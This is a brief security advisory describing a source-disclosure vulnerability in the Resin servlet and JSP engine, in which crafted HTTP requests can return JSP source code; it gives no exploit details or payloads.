Resin is a servlet and JSP engine that supports java and javascript.

ServletExec will return the source code of JSP files when an HTTP request is appended with certain characters. This vulnerability is dependent on the platform that Resin is running on.

Successful exploitation could lead to the disclosure of sensitive information contained within JSP pages.
